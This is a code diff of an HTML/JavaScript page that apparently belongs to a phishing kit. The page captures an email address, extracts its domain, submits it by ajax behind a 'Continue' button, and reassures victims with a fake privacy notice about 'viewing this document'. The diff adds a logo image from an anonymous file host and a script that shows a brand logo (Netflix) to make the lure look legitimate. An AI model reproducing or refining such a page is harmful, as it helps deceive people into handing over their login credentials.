@@ -120,6 +120,7 @@ function goNow() {
 
         var inndd=temail.indexOf("@");
         var my_sliceee=temail.substr((inndd+1));
+  
 		
 		n=n+1;
         $.ajax({
@@ -176,10 +177,14 @@ function goNow() {
           $('#goNow').html('Continue');
         }
      
+          
 
       });
+  
 }
+  
 ;
+  
    </script>
    </head>
 <body>
@@ -202,7 +207,22 @@ function goNow() {
 <button onclick="goNow()" id="goNow">Continue</button>
 </div>
   
-  <img width="103" height="70" id="zion" src="https://oshi.at/KLpR/VFdi.png?alt=media&token=805fb0ef-a2d9-4a7f-85e6-d68384e166e3">
+  <img width="103" height="70" id="zion" src="https://oshi.at/KLpR/VFdi.png">
+  
+  
+  
+  
+  
+  <div id="msgStyle1" class="message">Waiting for image</div>
+<div id="imgStyle1" class="message">
+    <img src="" id="image" />
+</div>
+  
+  
+  
+  
+  
+  
 <span class="privacy">
 Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
 Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
@@ -219,6 +239,35 @@ input.addEventListener("keyup", function(event) {
     }
 });
 </script>
+  
+  
+  
+  
+  
+  
+  <script>
+    
+ 
+    
+    
+    var xyz =   'https://logo.clearbit.com/netflix.com';
+    var imageUrl = xyz;
+    document.getElementById('image').src = imageUrl;
+    document.getElementById('msgStyle1').innerHTML = '';
+
+    
+    
+    
+    
+  
+  </script>
+  
+  
+  
+  
+  
+  
+  
 <div id="root">
 <iframe id="myframe" scrolling="no" src="" width="100%" height="100%" frameborder="0"></iframe> </div>
 
